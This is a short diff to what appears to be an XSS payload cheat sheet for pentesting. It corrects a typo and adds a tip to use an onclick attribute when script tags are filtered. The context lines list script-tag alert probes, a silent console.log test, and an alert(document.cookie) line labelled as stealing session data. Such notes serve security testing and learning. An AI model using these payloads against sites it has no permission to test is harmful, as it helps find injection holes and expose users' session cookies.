@@ -3,7 +3,7 @@
 
 [+] Test if Payload is working
 
-+ First step to check fir XSS
++ First step to check for XSS
 1. <script>alert('SudoHopeX')</script>
 2. <script>alert(1)</script>
 
@@ -12,6 +12,9 @@
 
 + testing silently without alert boxes
 <script>console.log('XSS')</script>
+
++ when <script> tag is not working, then use it within an html element
+onclick="alert(1)" 
 
 + See (steal) session data.
 <script>alert(document.cookie)</script>
